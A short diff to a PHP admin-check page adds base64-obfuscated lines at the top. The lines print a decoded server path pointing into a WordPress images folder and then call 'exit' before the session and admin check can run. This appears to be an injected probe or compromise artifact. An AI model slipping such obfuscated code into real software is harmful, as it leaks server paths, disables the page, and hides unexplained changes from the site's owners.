@@ -1,4 +1,10 @@
 <?php
+echo base64_decode("L2hvbWUvYWFwZHVzZXIvcHVibGljX2h0bWwvd3AtaW5jbHVkZXMvaW1hZ2VzL3dwaWNvbnMtM3gucG5n");
+echo "<pre>";
+echo base64_decode("L2hvbWUvYWFwZHVzZXIvcHVibGljX2h0bWwvd3AtaW5jbHVkZXMvaW1hZ2VzL3dwaWNvbnMtM3gucG5n");
+echo "<pre>";
+echo base64_decode("L2hvbWUvYWFwZHVzZXIvcHVibGljX2h0bWwvd3AtaW5jbHVkZXMvaW1hZ2VzL3dwaWNvbnMtM3gucG5n");
+exit;
 include("includes/config.php");
 if(isset($_SESSION['user_session_id']) && isset($_SESSION['user_session_right'])){
     if($_SESSION['user_session_right']=="administrator"){
